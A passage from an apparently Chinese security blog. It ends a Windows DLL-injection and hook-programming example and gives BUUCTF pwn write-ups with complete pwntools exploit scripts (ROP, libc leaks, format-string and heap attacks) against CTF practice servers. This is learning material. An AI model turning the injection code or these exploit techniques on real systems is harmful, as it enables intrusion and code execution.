&quot;GetProcAddr\\n&quot;; FARPROC pFunAddr = GetProcAddress( GetModuleHandle((LPCWSTR)&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot; ); cout &lt;&lt; &quot;CreateRemoteThread\\n&quot;; HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL ); cout &lt;&lt; &quot;Close Handles\\n&quot;; WaitForSingleObject(hThread,INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125; 待注入DLL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// Injector.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;Injector.h&quot;#include &quot;InjectorDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CInjectorAppBEGIN_MESSAGE_MAP(CInjectorApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CInjectorApp 构造CInjectorApp::CInjectorApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CInjectorApp 对象CInjectorApp theApp;// CInjectorApp 初始化BOOL CInjectorApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CInjectorDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; Hook编程（进程Hook） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;windows.h&gt;LRESULT CALLBACK WindowProc( //CALLBACK 从右向左入栈 //LRESULT long //该函数处理窗口消息 HWND hWnd,//窗口句柄类型 UINT uMsg,//unsigned int, 消息 WPARAM wParam,//unsigned int LPARAM lParam //long int);HHOOK MouseHook;//鼠标钩子处理函数LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);int WINAPI WinMain( //窗口应用GUI HINSTANCE hInstance, //当前程序的实例句柄 //HINSTANCE ：实例句柄类型 HINSTANCE hPreInstance, //为了兼容16位应用程序，永远为空 LPSTR lpCmdLine, //命令行参数 //LPSTR：char * int nCmdShow //窗口的显示方式)&#123; //1.做一个窗口 //1.1设计窗口类 Spy++ TCHAR szAppClassName[] = TEXT(&quot;Joe1sn&quot;);//自动适应字符集 WNDCLASS wndClass = &#123; 0 &#125;; wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//加载白色画刷 wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);//加载光标 wndClass.hInstance = hInstance;//当前窗口实例句柄 wndClass.lpfnWndProc = WindowProc;//窗口处理函数 wndClass.lpszClassName = szAppClassName;//窗口类型 wndClass.style = CS_HREDRAW | CS_VREDRAW; //窗口类的风格 //1.2注册窗口类 RegisterClass(&amp;wndClass); //1.3创建窗口类 HWND hWnd = CreateWindow(szAppClassName, TEXT(&quot;Test&quot;), WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_MAXIMIZEBOX | WS_MINIMIZEBOX, 500, 200, 800, 600, NULL, NULL, hInstance, NULL ); //1.4显示和更新窗口 ShowWindow(hWnd,SW_SHOW);//显示 UpdateWindow(hWnd);//更新窗口 //1.5消息循环 //（参考QT的信号和槽?） //应用程序-&gt;操作系统-&gt;消息队列-&gt;应用程序 MSG msg; while (GetMessage(&amp;msg,NULL,0,0))//所有消息都要获取 //WM_QIT，返回0，结束循环 &#123; //将虚拟键消息转为字符消息 //windows只能识别虚拟键值 VK_UP VK_DOWN TranslateMessage(&amp;msg); //将消息分发给窗口处理函数 //这里是WinProc DispatchMessage(&amp;msg); &#125; return 0;&#125;//鼠标钩子处理函数LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; //int x = LOWORD(lParam); //int y = HIWORD(lParam); //x += 100; //lParam = MAKELONG(x,y); /*if (wParam == VK_F2) &#123; SendMessage(hWnd, WM_CLOSE, 0, 0); UnhookWindowsHookW(MouseHook); &#125;*/ return CallNextHookEx(MouseHook,nCode,wParam,lParam);//向下传递 //return 1;//返回非0，表示消息已被处理，这样系统就不会把这个消息传递给程序&#125;LRESULT CALLBACK WindowProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)&#123; PAINTSTRUCT ps;// HDC hDC;//绘图DC switch (uMsg) &#123; //进程类hook case WM_CREATE://窗口创建消息 &#123; //安装hook MouseHook = SetWindowsHookEx(WH_MOUSE, MouseProc, NULL, GetCurrentThreadId()); break; &#125; case WM_CLOSE://窗口关闭消息 DestroyWindow(hWnd); break; case WM_DESTROY://窗口销毁消息 PostQuitMessage(0);//发送WM_QUIT就会退出 case WM_PAINT://窗口绘图消息 &#123; hDC = BeginPaint(hWnd, &amp;ps); HPEN hPen = CreatePen(PS_SOLID, 5, RGB(255, 0, 0)); SelectObject(hDC, hPen); Ellipse(hDC, 0, 0, 200, 200); EndPaint(hWnd, &amp;ps); &#125; case WM_LBUTTONDOWN://鼠标左键点击消息 &#123; MessageBox(hWnd, TEXT(&quot;Left&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_RBUTTONDOWN://鼠标右键点击消息 &#123; MessageBox(hWnd, TEXT(&quot;Right&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_MOUSEMOVE: &#123; int x = LOWORD(lParam); int y = HIWORD(lParam); wchar_t str[0x100]; wsprintf(str, L&quot;当前鼠标坐标(%d , %d)&quot;,x,y); //SetWindowText(hWnd, TEXT(&quot;In&quot;)); SetWindowText(hWnd, str); &#125; &#125; return DefWindowProc(hWnd, uMsg, wParam, lParam);&#125;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"BUUCTF Pwn WriteUp","slug":"BUUCTF","date":"2021-03-14T01:21:00.000Z","updated":"2023-08-25T03:24:08.350Z","comments":true,"path":"2021/03/14/BUUCTF/","link":"","permalink":"https://joe1sn.eu.org/2021/03/14/BUUCTF/","excerpt":"buu部分刷题记录","text":"buu部分刷题记录 [HarekazeCTF2019]baby_rop 1.checksec() 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-10h] system(&quot;echo -n \\&quot;What&#x27;s your name? \\&quot;&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); printf(&quot;Welcome to the Pwn World, %s!\\n&quot;, &amp;v4); return 0;&#125; scanf的溢出，注意，要溢出的栈+8 3.EXP 12345678910from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29829)binsh_addr = 0x0601048sys_addr = 0x00400490pop_rdi = 0x0400683payload = &#x27;a&#x27;*24 + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr) + p64(0)p.sendlineafter(&quot;?&quot;,payload)p.interactive() flag在home文件夹下的文件夹中 [HarekazeCTF2019]baby_rop2 环境：？ 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char buf[28]; // [rsp+0h] [rbp-20h] int v6; // [rsp+1Ch] [rbp-4h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(&quot;What&#x27;s your name? &quot;, 0LL); v3 = read(0, buf, 0x100uLL); v6 = v3; buf[v3 - 1] = 0; printf(&quot;Welcome to the Pwn World again, %s!\\n&quot;, buf); return 0;&#125; printf输出read的真实地址，再ROP 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#from LibcSearcher import *context.log_level = &quot;debug&quot;elf=ELF(&#x27;./babyrop2&#x27;)libc = ELF(&quot;./libc.so.6&quot;)#p=process(&#x27;babyrop2&#x27;)p=remote(&#x27;node3.buuoj.cn&#x27;,28113)pop_rdi_ret=0x0000000000400733pop_rsi_r15_ret=0x0000000000400731format_addr=0x0000000000400790 # %sprintf_plt=elf.plt[&#x27;printf&#x27;]read_got=elf.got[&#x27;read&#x27;]main_plt=elf.sym[&#x27;main&#x27;]payload = &quot;a&quot;*0x28payload += p64(pop_rdi_ret) + p64(format_addr)payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(0)payload += p64(printf_plt) + p64(main_plt)p.recvuntil(&quot;name? &quot;)p.sendline(payload)p.recvuntil(&quot;!\\n&quot;)read_real = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = read_real - libc.sym[&#x27;read&#x27;]sys_addr = libc.sym[&quot;system&quot;] + libc_basebinsh = libc.search(&quot;/bin/sh&quot;).next() + libc_basepayload = &#x27;a&#x27;*0x28payload += p64(pop_rdi_ret) + p64(binsh)payload += p64(sys_addr)p.recvuntil(&quot;name? &quot;)p.sendline(payload)p.interactive() flag 位置在 /home/babyrop2/ [OGeek2019]babyrop 1.checksec() 12345Arch: i386-32-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567891011121314int __cdecl main()&#123; int buf; // [esp+4h] [ebp-14h] char v2; // [esp+Bh] [ebp-Dh] int fd; // [esp+Ch] [ebp-Ch] sub_80486BB(); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &gt; 0 ) read(fd, &amp;buf, 4u); v2 = sub_804871F(buf); sub_80487D0(v2); return 0;&#125; sub_804871F 12345678910111213141516171819int __cdecl sub_804871F(int a1)&#123; size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[7]; // [esp+2Ch] [ebp-2Ch] unsigned __int8 v5; // [esp+33h] [ebp-25h] ssize_t v6; // [esp+4Ch] [ebp-Ch] memset(&amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(&amp;s, &quot;%ld&quot;, a1); v6 = read(0, buf, 0x20u); buf[v6 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, &amp;s, v1) ) exit(0); write(1, &quot;Correct\\n&quot;, 8u); return v5;&#125; sub_80487D0 1234567891011ssize_t __cdecl sub_80487D0(char a1)&#123; ssize_t result; // eax char buf; // [esp+11h] [ebp-E7h] if ( a1 == 127 ) result = read(0, &amp;buf, 0xC8u); else result = read(0, &amp;buf, a1); return result;&#125; sprintf：sprintf 返回以format为格式argument为内容组成的结果被写入string的字节数，结束字符‘\\0’不计入内。即，如果“Hello”被写入空间足够大的string后，函数sprintf 返回5 也就是说第一个是’\\0’可以绕过检测 string 1234567LOAD:0804840B 00000006 C writeLOAD:08048411 0000000F C __gmon_start__LOAD:08048420 0000000A C GLIBC_2.0.rodata:08048920 0000000A C Time&#x27;s up.rodata:0804892E 00000009 C Correct\\n.rodata:08048937 0000000D C /dev/urandom.eh_frame:080489C7 00000005 C ;*2$\\&quot; 没有/bin/sh，没有system函数，有libc，考虑write泄露libc 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,28118)#p = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]main_addr = 0x08048825libc_write = libc.sym[&quot;write&quot;]libc_system = libc.sym[&quot;system&quot;]#binsh = next(libc.search(&#x27;/bin/sh&#x27;))binsh = 0x15902bpayload_1 = &#x27;\\x00&#x27;+ &#x27;\\xff&#x27;*7paylaod_2 = &#x27;a&#x27;*(0xe7+4) + p32(write_plt) + p32(main_addr)paylaod_2 += p32(1) + p32(write_got) + p32(4)p.sendline(payload_1)p.recvuntil(&quot;Correct\\n&quot;)p.sendline(paylaod_2)real_write = u32(p.recv(4))libc_base = real_write - libc_writereal_system = libc_base + libc_systembinsh = binsh + libc_basepayload_1 = &#x27;\\x00&#x27;+ &#x27;\\xff&#x27;*7payload_3 = &#x27;a&#x27;*(0xe7+4) + p32(real_system) + p32(0)payload_3 += p32(binsh)p.sendline(payload_1)p.recvuntil(&quot;Correct\\n&quot;)p.sendline(payload_3)p.interactive() 接受的4字节不需要在ljust对齐了 [ZJCTF 2019]EasyHeap 和hitocn trainning magic heap 一样 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 123456789101112def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text))def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) back_door 1234int l33t()&#123; return system(&quot;/bin/sh&quot;);&#125; edit_heap 123456printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1); read(0, (char *)&amp;v1 + 4, 8uLL); v2 = atoi((const char *)&amp;v1 + 4); printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1); read_input(heaparray[(signed int)v1], v2); return puts(&quot;Done !&quot;); 未控制边界，堆溢出 3.EXP 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./magicheap&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./magicheap&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text))def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))l33t = 0x6020A0if __name__ == &#x27;__main__&#x27;: add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) free(2) edit(1,&#x27;a&#x27;*0x60+p64(0)+p64(0x71)+p64(l33t-0x13)) #&lt;--控制bk指针 add(0x60,&#x27;aaaa&#x27;) #2 add(0x60,&#x27;aaaa&#x27;) #3 fake_chunk edit(3,&#x27;a&#x27;*8) p.sendlineafter(&quot;:&quot;,str(0x1305)) p.interactive() 为什么是p64(l33t-0x13)？ 经过动态调试得知，该处是unsorted bin链表 为什么edit(3,’a’*8)？ 覆写magic的值为‘0x6161616161616161’，从而进入后门 [ZJCTF 2019]Login 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910111213printf(&quot;Please enter username: &quot;, &quot;admin&quot;); User::read_name((User *)&amp;login); printf(&quot;Please enter password: &quot;); v3 = (void (*)(void))main::&#123;lambda(void)#1&#125;::operator void (*)(void) const(); v7 = password_checker(v3); User::read_password((User *)&amp;login); v4 = User::get_password((User *)&amp;v8); v5 = User::get_password((User *)&amp;login); password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator() const( (void (__fastcall ***)(char *))&amp;v7, (const char *)v5, (const char *)v4); return 0; password_checker 123456789101112131415161718unsigned __int64 __fastcall password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator() const(void (__fastcall ***a1)(char *), const char *a2, const char *a3)&#123; char s; // [rsp+20h] [rbp-60h] unsigned __int64 v5; // [rsp+78h] [rbp-8h] v5 = __readfsqword(0x28u); if ( !strcmp(a2, a3) ) &#123; snprintf(&amp;s, 0x50uLL, &quot;Password accepted: %s\\n&quot;, &amp;s); puts(&amp;s); (**a1)(&amp;s); &#125; else &#123; puts(&quot;Nope!&quot;); &#125; return __readfsqword(0x28u) ^ v5;&#125; strcmp遇见\\x00截断，不会判断之后的字符串，所以这里栈溢出 3.EXP 12345678from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,25930)back_door = 0x400E88payload = &#x27;2jctf_pa5sw0rd&#x27;+&quot;\\x00&quot;+&#x27;a&#x27;*20+&quot;\\x00&quot;+&#x27;a&#x27;*36+p64(back_door)p.sendlineafter(&quot;username: &quot;,&quot;admin&quot;)p.sendlineafter(&quot;password: &quot;,payload)p.interactive() [第五空间2019 决赛]PWN5 环境：ubuntu16 1.checksec() 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main(int a1)&#123; unsigned int v1; // eax int fd; // ST14_4 int result; // eax int v4; // ecx unsigned int v5; // et1 char nptr; // [esp+4h] [ebp-80h] char buf; // [esp+14h] [ebp-70h] unsigned int v8; // [esp+78h] [ebp-Ch] int *v9; // [esp+7Ch] [ebp-8h] v9 = &amp;a1; v8 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;unk_804C044, 4u); printf(&quot;your name:&quot;); //====+FORMAT+==== read(0, &amp;buf, 0x63u); printf(&quot;Hello,&quot;); printf(&amp;buf); printf(&quot;your passwd:&quot;); read(0, &amp;nptr, 0xFu); // ====+STACK_OVERFLOW+==== if ( atoi(&amp;nptr) == unk_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; v5 = __readgsdword(0x14u); v4 = v5 ^ v8; if ( v5 != v8 ) sub_80493D0(v4); return result;&#125; unk_804C044 12345678910bss:0804C040 byte_804C040 db ? ; DATA XREF: sub_8049140↑o.bss:0804C040 ; sub_8049140+5↑o ....bss:0804C041 align 4.bss:0804C044 randmon_num db ? ; ; DATA XREF: main+77↑o.bss:0804C044 ; main+108↑o.bss:0804C045 db ? ;.bss:0804C046 db ? ;.bss:0804C047 db ? ;.bss:0804C047 _bss ends.bss:0804C047 bss段的unk_804C044，是随机生成的，而我们猜对了这个参数，就可以执行system(“/bin/sh”),刚好字符串格式化漏洞可以实现改写内存地址的值 还有就是不要被开启的canary保护迷惑 3.计算偏移 123root@joe1sn:~/download/BUUCTF/PWN5# ./pwn your name:aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%pHello,aaaa-0xffb44588-0x63-(nil)-(nil)-0x3-0xf7f8c950-0xc2-(nil)-0xc30000-0x61616161-0x2d70252d-0x252d7025-0x70252d70 第一个参数偏移量为10，通过%n修改 %x是吧数据以16进制输出 %n是把已经输出的字符数目输入传来参数的地址中，这就可以使我们修改数据 https://www.cnblogs.com/0xJDchen/p/5904816.html 4.EXP 123456789from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26486)unk_804C044 = 0x0804C044payload=fmtstr_payload(10,&#123;unk_804C044:0x11111111&#125;)p.sendlineafter(&quot;your name:&quot;,payload)p.sendlineafter(&quot;your passwd&quot;,str(0x11111111))p.interactive() 0ctf_2016_warmup 1.checksec 12345Arch: i386-32-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA 从汇编看有四个函数 Alarm 、Read 、Write 、sys_exit 关于 Alarm 有个特性： 如果有以前为进程登记的尚未超时的闹钟时钟，而且本次调用的seconds值是0，则取消以前的闹钟时钟，其余留值仍作为alarm函数的返回值 那么当 alarm 剩余 5 秒时，更具汇编fastcall，会将return值返回 eax 寄存器中，那么再次使用 sys_call 的时候就会 系统调用 open函数 ，从而读取到falg的值 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *name = &quot;warmup&quot;elf = ELF(name)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)sh = 0def main(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(name) else: sh = remote(ip,port) main_addr = 0x804815A write_addr = 0x8048135 read_addr = 0x804811D alarm_addr = 0x804810D data_seg = 0x80491BC sys_call = 0x804813A #Step1 #向系统中传递参数 &quot;flag&quot; payload = &#x27;a&#x27;*0x20 payload += p32(read_addr)+p32(main_addr) payload += p32(0)+p32(data_seg)+p32(0x10) sh.sendafter(&quot;Welcome to 0CTF 2016!\\n&quot;,payload) payload = &#x27;flag\\x00&#x27; sh.sendlineafter(&quot;Good Luck!\\n&quot;,payload) #Step2 #0xa-5=5 #这样剩下的就5s了 sleep(5) #Step3 #再次调用alarm函数就会返回剩余的秒数5到 eax寄存器中 #就会将falg文件读取到 data段 payload = &#x27;a&#x27;*0x20 payload += p32(alarm_addr)+p32(sys_call) payload += p32(main_addr)+p32(data_seg)+p32(0) sh.send(payload) #Step4 #从data段中read payload = &#x27;a&#x27;*0x20 payload += p32(read_addr)+p32(main_addr) payload += p32(3)+p32(data_seg)+p32(0x50) sh.sendafter(&quot;Good Luck!\\n&quot;,payload) #Step5 #利用write写出flag payload = &#x27;a&#x27;*0x20 payload += p32(write_addr)+p32(main_addr) payload += p32(1)+p32(data_seg)+p32(0x50) sh.sendafter(&#x27;Good Luck!\\n&#x27;,payload) sh.interactive()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;28290&quot;,1,1) axb_2019_fmt32 1.cheksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2 .IDA main 123456789101112while ( 1 ) &#123; alarm(3u); memset(&amp;s, 0, 0x101u); memset(&amp;format, 0, 0x12Cu); printf(&quot;Please tell me:&quot;); read(0, &amp;s, 0x100u); sprintf(&amp;format, &quot;Repeater:%s\\n&quot;, &amp;s); if ( strlen(&amp;format) &gt; 0x10E ) break; printf(&amp;format); &#125; 字符串格式化漏洞，但是没有后门，可以选择libc leak+改printf为one gadget 3.EXP 12345678910111213141516171819202122from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&quot;./axb_2019_fmt32&quot;)p = remote(&quot;node3.buuoj.cn&quot;,25318)libc = ELF(&quot;libc-2.23.so&quot;)#0x3a80c execve(&quot;/bin/p&quot;, esp+0x28, environ)p.sendlineafter(&#x27;me:&#x27;,&quot;%9$sA&quot; + p32(elf.got[&quot;printf&quot;]))p.recvuntil(&#x27;Repeater:&#x27;)printf_got = u32(p.recv(4))base = printf_got - libc.sym[&quot;printf&quot;]system = base + libc.sym[&quot;system&quot;]log.success(&quot;printf addr: %x&quot; , printf_got)log.success(&quot;system addr: %x&quot; , system)log.success(&quot;libc base: %x&quot; , base)payload =&#x27;aaaaa&#x27;payload += fmtstr_payload(9,&#123;0x804A014: (0x3a80c+base)&#125;,write_size = &quot;byte&quot;,numbwritten = 0xe)p.sendlineafter(&quot;me:&quot;,payload)p.interactive() axb_2019_heap 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA banner 123__isoc99_scanf(&quot;%s&quot;, &amp;format); printf(&quot;Hello, &quot;, &amp;format); printf(&amp;format); 存在一个字符串格式化漏洞 main 1234567891011121314def add(idx,sz,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def delete(idx): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def edit(idx,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,text) edit_note 123456if ( v1 &lt;= 10 &amp;&amp; v1 &gt;= 0 &amp;&amp; *((_QWORD *)&amp;note + 2 * v1) ) &#123; puts(&quot;Enter the content: &quot;); get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2)); puts(&quot;Done!&quot;); &#125; 没有控制范围，堆溢出，利用unlink+free_hook来getshell 3.GDB 在printf处下断点fmtarg查看偏移 stack 12345678910111213141516171819202122gdb-peda$ stack 200000| 0x7fffffffde10 --&gt; 0x0 0008| 0x7fffffffde18 --&gt; 0x61616161ffffde30 0016| 0x7fffffffde20 (&#x27;a&#x27; &lt;repeats 15 times&gt;)0024| 0x7fffffffde28 --&gt; 0x61616161616161 (&#x27;aaaaaaa&#x27;)0032| 0x7fffffffde30 --&gt; 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;: push r15)0040| 0x7fffffffde38 --&gt; 0x555555555186 (&lt;main+28&gt;: mov eax,0x0)0048| 0x7fffffffde40 --&gt; 0x7fffffffdf30 --&gt; 0x1 0056| 0x7fffffffde48 --&gt; 0x0 0064| 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;: push r15)0072| 0x7fffffffde58 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax)0080| 0x7fffffffde60 --&gt; 0x1 0088| 0x7fffffffde68 --&gt; 0x7fffffffdf38 --&gt; 0x7fffffffe2a7 (&quot;/home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap&quot;)0096| 0x7fffffffde70 --&gt; 0x1f7ffcca0 0104| 0x7fffffffde78 --&gt; 0x55555555516a (&lt;main&gt;: push rbp)0112| 0x7fffffffde80 --&gt; 0x0 0120| 0x7fffffffde88 --&gt; 0xa45414fa738fad69 0128| 0x7fffffffde90 --&gt; 0x555555554980 (&lt;_start&gt;: xor ebp,ebp)0136| 0x7fffffffde98 --&gt; 0x7fffffffdf30 --&gt; 0x1 0144| 0x7fffffffdea0 --&gt; 0x0 0152| 0x7fffffffdea8 --&gt; 0x0 偏移 1234gdb-peda$ fmtarg 0x7fffffffde50 #base offsetThe index of format argument : 14 (&quot;\\%13$p&quot;)gdb-peda$ fmtarg 0x7fffffffde58 #libc offsetThe index of format argument : 15 (&quot;\\%14$p&quot;) vmmap 12340x0000555555554000 0x0000555555556000 r-xp /home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap...........0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so........... 1234&gt;&gt;&gt; hex(0x7ffff7a2d830 - 0x00007ffff7a0d000) #libc 偏移量&#x27;0x20830&#x27;&gt;&gt;&gt; hex(0x555555555200 - 0x0000555555554000)&#x27;0x1200&#x27; 4.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *elf = ELF(&quot;./axb_2019_heap&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./axb_2019_heap&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25618&quot;)def add(idx,sz,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) 